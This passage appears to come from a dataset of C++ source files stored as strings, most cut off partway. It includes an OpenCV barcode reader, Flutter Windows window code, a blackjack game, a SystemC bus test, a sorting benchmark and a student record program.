0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn 0;\n}\n",
    "// Track_Detector.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n#include <iostream>\r\n#include <vector>\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc.hpp>\r\n#include <string>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nconst char* image_window = \"Source Image\";\r\n//const char* result_window = \"Result window\";\r\nint font_size = 1;\r\nScalar font_color(0, 0, 0);\r\nint font_weight = 2;\r\n\r\nvoid save(Mat image,string path) {\r\n    bool isSuccess = imwrite(path, image);\r\n    if (isSuccess == false) {\r\n        cout << \"Failed to save image\" << endl;\r\n        cin.get();\r\n    }\r\n    else {\r\n        cout << \"Image saved\" << endl;\r\n    }\r\n}\r\n\r\nint** TemplateMatching(Mat source, Mat templ, int objectNum) {\r\n    int** arr = new int* [objectNum];\r\n    Mat result;\r\n    double minVal;\r\n    double maxVal;\r\n    Point minLoc;\r\n    Point matchLoc;\r\n    Point maxLoc;\r\n    int j = 0;\r\n    for (int k = 0; k < objectNum; k++, j++) {\r\n        matchTemplate(source, templ, result, TM_SQDIFF_NORMED);\r\n        minMaxLoc(result, &minVal, &maxVal, &minLoc, &maxLoc, Mat());\r\n        matchLoc = minLoc;\r\n        arr[k] = new int[objectNum];\r\n        arr[k][0] = matchLoc.x;\r\n        arr[k][1] = matchLoc.y;\r\n        for (int i = 0; i < templ.cols; i++) {\r\n            for (int j = 0; j < templ.rows; j++) {\r\n                source.at<Vec2b>(matchLoc.y + j, (matchLoc.x + i) / 2) = 0;\r\n            }\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\nint Table(int binary) {\r\n    switch (binary) {\r\n    case(21100001):\r\n        return 1;\r\n        break;\r\n    case(21010010):\r\n        return 2;\r\n        break;\r\n    case(10110011):\r\n        return 3;\r\n        break;\r\n    case(20110100):\r\n        return 4;\r\n        break;\r\n    case(11010101):\r\n        return 5;\r\n        break;\r\n    case(11100110):\r\n        return 6;\r\n        break;\r\n    case(20000111):\r\n        return 7;\r\n        break;\r\n    case(11111000):\r\n        return 8;\r\n        break;\r\n    case(20011001):\r\n        return 9;\r\n        break;\r\n    case(20101010):\r\n        return 0;\r\n        break;\r\n    default:\r\n        return 0;\r\n        break;\r\n    }\r\n}\r\n\r\nvoid Barcode(Mat source, int x, int y, Mat templ) {\r\n    int barcode[80];\r\n    memset(barcode, 0, sizeof(barcode));\r\n    int textNum[10];\r\n    memset(textNum, 0, sizeof(textNum));\r\n    int adjust;\r\n    std::ostringstream oss;\r\n    for (int N = 0; N < 2; N++) {\r\n        int test = 0;\r\n        int index = 0;\r\n        int count = 0;\r\n        int width = 29;\r\n        int norm = 12;\r\n        int threshold = 100;\r\n        while (index != 100) {\r\n            test = int(source.at<Vec2b>(y + index, x / 2 + 66 - N * 44)[0]);\r\n            if (test < threshold - 10 && test > 50) {\r\n                count += 1;\r\n            } //makes sure its a barcode value and not random black dot\r\n            if (count > 2 && test > threshold - 20) {  //found barcode\r\n                for (int i = 0; i < 40; i++) {//barcode sections\r\n                    for (int n = 0; n < 29; n++) {//each section value\r\n                        barcode[i + N * 40] += source.at<Vec2b>(y + index - count / 2 - norm + i * 29 + n, x / 2 + 66 - N * 44)[0];\r\n                    }//total value of each section\r\n                    if (barcode[i + N * 40] / width > threshold) {\r\n                        barcode[i + N * 40] = 0;\r\n                    }\r\n                    else {\r\n                        barcode[i + N * 40] = 1;\r\n                    }\r\n                }\r\n                index = 100;\r\n            }\r\n            else {\r\n                index += 1;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < 10; i++) {\r\n        for (int j = 0; j < 8; j++) {\r\n            if (j == 0) {\r\n                adjust = 1;\r\n            }\r\n            else {\r\n                adjust = 0;\r\n            }\r\n            textNum[i] += (barcode[i * 8 + j] + adjust) * pow(10, 7 - j);\r\n        }\r\n        textNum[i] = Table(textNum[i]);\r\n    }\r\n    oss << \"Photo: \" << textNum[1] << textNum[2] << textNum[3] << textNum[4] << \"; Roll: \" << textNum[6] << textNum[7] << textNum[8] << textNum[9] << \"; Cam: \" << textNum[5] << \"; Expan: \" << textNum[0];\r\n    std::string var = oss.str();\r\n    Point text_position(source.cols / 2, y / 2);\r\n    putText(source, var, text_position, FONT_HERSHEY_COMPLEX, font_size, font_color, font_weight);\r\n}\r\n\r\nvoid find_track(Mat source,int x, int y) {\r\n    int j = 0;\r\n    int count = 0;\r\n    int test;\r\n    //rectangle(source, Point(500, 500), Point(600, 600), Scalar(0, 0, 255));\r\n    while (j == 0) {\r\n        test = int(source.at<Vec2b>(y + count, x)[0]);\r\n        cout << count << endl;\r\n        if (test < 90 && test > 50) {\r\n            rectangle(source,Point(y+count,x),Point(y + count + 100,x + 100),Scalar(0,255,255));\r\n            j = 1;\r\n        }\r\n        count += 1;\r\n        if (count > 1000) {\r\n            rectangle(source, Point(y + count, x), Point(y ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\r\n#include <iostream>\r\n#include <stdlib.h>\r\nint Choice;\r\nint HitFunction(int PlayerHitHand);\r\nint SplitHitFunction(int SplitHitHand1);\r\nint SplitHit2Function(int SplitHitHand2);\r\nint SplitStay(int DealerHand);\r\nint StayFunction(int DealerStayHand);\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nint main()\r\n{\r\n\tsrand(static_cast<int>(time(NULL)));\r\n\tbool Play = true;\r\n\tbool Splitplay = false;\r\n\tint DealerCard1 = rand() % 11 + 1;\r\n\tint DealerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard1 = rand() % 11 + 1;\r\n\tint PlayerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard3 = rand() % 11 + 1;\r\n\tint PlayerCard4 = rand() % 11 + 1;\r\n\tint DealerHand = DealerCard1 + DealerCard2;\r\n\tint PlayerHand = PlayerCard1 + PlayerCard2;\r\n\tif (PlayerCard1 && PlayerCard2 == 11)\r\n\t{\r\n\t\tPlayerCard1 -= 1;\r\n\t\tcout << \"Playercard1 is now equal to: \" << PlayerCard1 << endl;\r\n\t}\r\n\tif (DealerCard1 && DealerCard2 == 11)\r\n\t{\r\n\t\tDealerCard1 -= 1;\r\n\t\tcout << \"Dealercard1 is now equal to: \" << DealerCard1 << endl;\r\n\t}\r\n\tif (DealerHand == 21)\r\n\t{\r\n\t\tcout << \"Dealer has a natural blackjack you lose!\" << endl;\r\n\t\tPlay = false;\r\n\t\tSplitplay = false;\r\n\t\treturn 0;\r\n\t}\r\nif (PlayerCard1 == PlayerCard2 || Splitplay == true)\r\n{\r\n\t\t\r\nchar YesNo;\r\ncout << \"Your first card: \" << PlayerCard1 << \" \" << \"Your second card: \" << PlayerCard2 << endl;\r\ncout << \"Would you like to split?\" << endl;\r\ncout << \"Y/N\" << endl;\r\ncin >> YesNo;\r\nint PlayerHandSplit1 = PlayerCard1 + PlayerCard3;\r\nint PlayerHandSplit2 = PlayerCard2 + PlayerCard4;\r\nif (YesNo == 'Y' || YesNo == 'y')\r\n{\r\n\tdo\r\n\t{\r\n\t\tbool Hit1 = true;\r\n\t\tbool Hit = true;\r\n\t\tSplitplay = true;\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit1)\r\n\t{\r\n\t\tPlayerHandSplit1 += SplitHitFunction(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n        \tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\tif (PlayerHandSplit1 > 21 || PlayerHandSplit2 > 21)\r\n\t{\r\n\t\tcout << \"You busted! You lose!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit1 = false;\r\n\t}\r\n\tchar YesNo;\r\n\tcout << \"Would you like to hit again?\" << endl;\r\n\tcout << \"Y/N?\" << endl;\r\n\tcin >> YesNo;\r\n\tif (YesNo == 'Y' || YesNo == 'y')\r\n\t{\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\tHit1 = false;\r\n\t}\r\n\t}\r\n\tbreak;\r\n\tcase 2:\r\n\twhile (DealerHand <= 16)\r\n\t{\r\n\t\tDealerHand += SplitStay(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Player:\" << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2\r\n\t\t<< \" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tHit1 = false;\r\n\t\tSplitplay = false;\r\n\t\tPlay = false;\r\n\tif (DealerHand > 21)\r\n\t{\r\n\t\tcout << \"Dealer busted! You win!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit = false;\r\n\t\tPlay = false;\r\n\t}\r\n\t}\r\n\t\t\t\t\t\t\r\n\tbreak;\r\n\tdefault:\r\n\tbreak;\r\n\t}\r\n\tif (Play == true)\r\n\t{\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"For second hand hit?\" << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit)\r\n\t{\r\n\t\tPlayerHandSplit2 += SplitHit2Function(PlayerHandSplit2);\r\n\t\tcout << \"Dealer:\" ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  test1.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n#include \"systemc.h\"\n\nSC_MODULE( proc1 )\n{\n  SC_HAS_PROCESS( proc1 );\n\n  sc_signal_resolved& out;\n  sc_in<bool> in;\n\n  proc1( sc_module_name n,\n\t sc_signal_resolved& OUT_,\n\t sc_signal<bool>& IN_ )\n    : out(OUT_)\n  {\n    in(IN_);\n\tSC_METHOD( entry );\n    sensitive << in;\n  }\n\n  void entry();\n};\n\nvoid\nproc1::entry()\n{\n  if ((bool) in == true) {\n    cout << \"P1: Set to 1\" << endl;\n    out = SC_LOGIC_1;//'1';\n  }\n  else {\n    cout << \"P1: Set to Z\" << endl;\n    out = SC_LOGIC_Z;//'Z';\n  }\n}\n\n\nSC_MODULE( proc2 )\n{\n  SC_HAS_PROCESS( proc2 );\n\n  sc_signal_resolved& out;\n  sc_in<bool> in;\n\n  proc2( sc_module_name n,\n\t sc_signal_resolved& OUT_,\n\t sc_signal<bool>& IN_ )\n    : out(OUT_)\n  {\n    in(IN_);\n\tSC_METHOD( entry );\n    sensitive << in;\n  }\n\n  void entry();\n};\n\nvoid\nproc2::entry()\n{\n  if ((bool) in == false) {\n    cout << \"P2: Set to 0\" << endl;\n    out = SC_LOGIC_0;//'0';\n  }\n  else {\n    cout << \"P2: Set to Z\" << endl;\n    out = SC_LOGIC_Z;//'Z';\n  }\n}\n\nSC_MODULE( proc3 )\n{\n  SC_HAS_PROCESS( proc3 );\n\n  const sc_signal_resolved& in;\n\n  proc3( sc_module_name n,\n\t const sc_signal_resolved& IN_ )\n    : in(IN_)\n  {\n    SC_METHOD( entry );\n    sensitive << in;\n  }\n\n  void entry()\n  {\n    sc_logic v;\n    v = in;\n    cout << \"Value on Bus = \" << v.to_char() << endl;\n  }\n};\n\nint sc_main(int ac, char *av[])\n{\n  sc_signal_resolved Bus;\n  sc_signal<bool> clock;\n\n  proc1 P1(\"P1\", Bus, clock);\n  proc2 P2(\"P2\", Bus, clock);\n  proc3 P3(\"P3\", Bus);\n\n  sc_start(1, SC_NS);\n  clock = 1;\n  sc_start(10, SC_NS);\n  for (int i = 0; i < 3; i++) {\n    clock = 0;\n    sc_start(10, SC_NS);\n    clock = 1;\n    sc_start(10, SC_NS);\n  }\n  return 0;\n}\n\n",
    "#include <chrono>\n#include <iostream>\n#include <unistd.h>\n#include <numeric>\n#include <algorithm>\n#include <vector>\n#include \"SortingAlgorithm.hpp\"\n#include <iomanip>\n\nusing namespace std;\n\ntemplate<typename T>\ndouble TimeBubble(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::BubbleSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\ntemplate<typename T>\ndouble TimeMerge(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::MergeSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\n\nint main(int argc, char ** argv)\n{\n    int n = 0;\n    size_t dimv = stoi(argv[1]);\n    unsigned int iters = 100;\n    vector<int> v(dimv);\n    double time_Bubble = 0;\n    double time_Merge = 0;\n\n    cout << scientific << setprecision(4);\n    // Vector of random integers in range 0-987\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            v[i] = rand() % 987;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v = time_Bubble/iters;\n    double time_MergeSort_v = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v << endl\n         << \"MergeSort : \" << time_MergeSort_v << endl << endl;\n\n\n    // Vector of random doubles in range 0-1\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    vector<double> w(dimv);\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            w[i] = rand();\n        }\n        vector<double> w_copia = w;\n\n        time_Bubble += TimeBubble(w);\n        time_Merge += TimeMerge(w_copia);\n    }\n    double time_BubbleSort_w = time_Bubble/iters;\n    double time_MergeSort_w = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random doubles vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_w << endl\n         << \"MergeSort : \" << time_MergeSort_w << endl << endl;\n\n\n    // Vector of ascending ordered integers\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    vector<int> v_copia = v;\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v3 = time_Bubble/iters;\n    double time_MergeSort_v3 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a ordered integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v3 << endl\n         << \"MergeSort : \" << time_MergeSort_v3 << endl << endl;\n\n\n    unsigned int half_dim = dimv/2;\n    // Vector of ordered integers with the fist half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<half_dim; i++){\n            v[i] = rand() % half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v1 = time_Bubble/iters;\n    double time_MergeSort_v1 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the fist half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v1 << endl\n         << \"MergeSort : \" << time_MergeSort_v1 << endl << endl;\n\n\n    // Vector of ordered integers with the second half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=half_dim; i<dimv; i++){\n            v[i] = rand() % dimv + half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v2 = time_Bubble/iters;\n    double time_MergeSort_v2 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the second half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v2 << endl\n         << \"MergeSort : \" << time_MergeSort_v2 << endl << endl;\n\n\n    // Vector of ordered integers which elements have been switched in pairs\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    int dimv_floor = (dimv/2)*2;\n    for (unsigned int ",
    "//PROJECT: Student Record Management System using C++\n//Written by Md Zakaullah\n#include<iostReam>\nusing namespace std;\nstring Roll_no[30],name[30],Class[30],course[30],mobile_no[30],admission_year[30];\nint total=0;\nvoid Enter()\n{\nint ch=0;\ncout<<\"How many students do u want to Enter??\"<<endl;\ncin>>ch;\nif(total==0)\n{\ntotal=ch+total;\nfor(int i=0;i<ch;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO:: \"<<endl;\ncin>>Roll_no[i];\ncout<<\"Enter Name: \"<<endl;\ncin>>name[i];\ncout<<\"Enter Class: \"<<endl;\ncin>>Class[i];\ncout<<\"Enter Course: \"<<endl;\ncin>>course[i];\ncout<<\"Enter Mobile NO: \"<<endl;\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \"<<endl;\ncin>>admission_year[i];\n}\n}\nelse\n{\nfor(int i=total;i<ch+total;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter Course: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\ntotal=ch+total;\n}\n}\nvoid show()\n{\nif(total==0)\n{\ncout<<\"No Data is Entered\"<<endl;\n}\nelse\n{\nfor(int i=0;i<total;i++)\n{\ncout<<\"\\nData of Student \"<<i+1<<endl<<endl;\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\nvoid search()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse\n{\nstring Rollno;\ncout<<\"Enter the Roll no of student\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\n}\nvoid update()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse{\nstring Rollno;\ncout<<\"Enter the Roll no of student which you want to 